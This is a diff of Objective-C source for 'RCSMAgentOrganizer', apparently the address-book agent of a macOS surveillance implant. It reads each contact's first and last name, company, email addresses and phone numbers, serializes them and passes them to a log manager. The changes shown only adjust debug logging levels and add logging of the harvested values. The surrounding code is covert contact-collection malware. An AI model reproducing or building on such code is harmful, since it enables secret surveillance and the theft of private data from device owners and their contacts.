@@ -51,7 +51,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
   
   ABAddressBook *addressBook = [ABAddressBook sharedAddressBook];
@@ -97,7 +97,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"userInfo dict: %@", [aNotification userInfo]);
+  verboseLog(@"userInfo dict: %@", [aNotification userInfo]);
 #endif
   
   int i = 0;
@@ -175,20 +175,22 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (NSData *)_prepareContactForLogging: (ABRecord *)aRecord
 {
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
+  
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
   NSMutableData *contactLog     = [NSMutableData new];
   
   // First Name
   if ([aRecord valueForProperty: kABFirstNameProperty])
     {
-#ifdef DEBUG_ORGANIZER
-      verboseLog(@"FirstName property");
-#endif
       NSString *element   = [aRecord valueForProperty: kABFirstNameProperty];
       NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"FirstName: %@", element);
+#endif
+
       NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                        withType: FirstName];
       [serializedData retain];
@@ -199,11 +201,12 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   // Last Name
   if ([aRecord valueForProperty: kABLastNameProperty])
     {
-#ifdef DEBUG_ORGANIZER
-      verboseLog(@"LastName property");
-#endif
       NSString *element   = [aRecord valueForProperty: kABLastNameProperty];
       NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
+
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"LastName: %@", element);
+#endif
       
       NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                        withType: LastName];
@@ -215,12 +218,13 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   // Company Name
   if ([aRecord valueForProperty: kABOrganizationProperty])
     {
-#ifdef DEBUG_ORGANIZER
-      verboseLog(@"CompanyName property");
-#endif
       NSString *element   = [aRecord valueForProperty: kABOrganizationProperty];
       NSData *recordData  = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       
+#ifdef DEBUG_ORGANIZER
+      infoLog(@"CompanyName: %@", element);
+#endif
+
       NSData *serializedData = [self _serializeSingleRecordData: recordData
                                                        withType: CompanyName];
       [serializedData retain];
@@ -232,9 +236,6 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   // MultiValue
   if ([aRecord valueForProperty: kABEmailProperty])
     {
-#ifdef DEBUG_ORGANIZER
-      verboseLog(@"EmailAddress property");
-#endif
       ABMultiValue *email = [aRecord valueForProperty: kABEmailProperty];
       int i = 0;
       
@@ -254,6 +255,10 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
           NSString *element       = [email valueAtIndex: i];
           NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
           uint32_t type           = 0;
+
+#ifdef DEBUG_ORGANIZER
+          infoLog(@"EmailAddress: %@", element);
+#endif
           
           switch (i)
             {
@@ -280,14 +285,11 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   // MultiValue
   if ([aRecord valueForProperty: kABPhoneProperty])
     {
-#ifdef DEBUG_ORGANIZER
-      verboseLog(@"Phone property");
-#endif
       ABMultiValue *phone = [aRecord valueForProperty: kABPhoneProperty];
       int i = 0;
       
 #ifdef DEBUG_ORGANIZER
-      verboseLog(@"phone entries: %d", [phone count]);
+      infoLog(@"phone entries: %d", [phone count]);
 #endif
       for (i = 0; i < [phone count]; i++)
         {
@@ -303,37 +305,38 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
             }
           
           NSString *element       = [phone valueAtIndex: i];
-#ifdef DEBUG_ORGANIZER
-          verboseLog(@"phone: %@", element);
-#endif
           NSData *recordData      = [element dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
           uint32_t type           = 0;
+
+#ifdef DEBUG_ORGANIZER
+          infoLog(@"Phone: %@", element);
+#endif
           
           if ([[phone labelAtIndex: i] isEqualToString: kABPhoneMobileLabel])
             {
 #ifdef DEBUG_ORGANIZER
-              verboseLog(@"is Mobile");
+              infoLog(@"is Mobile");
 #endif
               type = MobileTelephoneNumber;
             }
           else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneWorkLabel])
             {
 #ifdef DEBUG_ORGANIZER
-              verboseLog(@"is Business");
+              infoLog(@"is Business");
 #endif
               type = BusinessTelephoneNumber;
             }
           else if ([[phone labelAtIndex: i] isEqualToString: kABPhoneHomeLabel])
             {
 #ifdef DEBUG_ORGANIZER
-              verboseLog(@"is Home");
+              infoLog(@"is Home");
 #endif
               type = HomeTelephoneNumber;
             }
           else
             {
 #ifdef DEBUG_ORGANIZER
-              warnLog(@"Forcing to HomePhone for (%@)", [phone labelAtIndex: i]);
+              infoLog(@"Forcing to HomePhone for (%@)", [phone labelAtIndex: i]);
 #endif
               // Forcing home telephone number just in case
               type = HomeTelephoneNumber;
@@ -374,7 +377,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (BOOL)_logData: (NSMutableData *)aLogData
 {
 #ifdef DEBUG_ORGANIZER
-  infoLog(@"");
+  verboseLog(@"");
 #endif
   
   RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
@@ -537,8 +540,9 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 - (BOOL)stop
 {
 #ifdef DEBUG_ORGANIZER
-  warnLog(@"");
+  verboseLog(@"");
 #endif
+  
   int internalCounter = 0;
   
   [mConfiguration setObject: AGENT_STOP
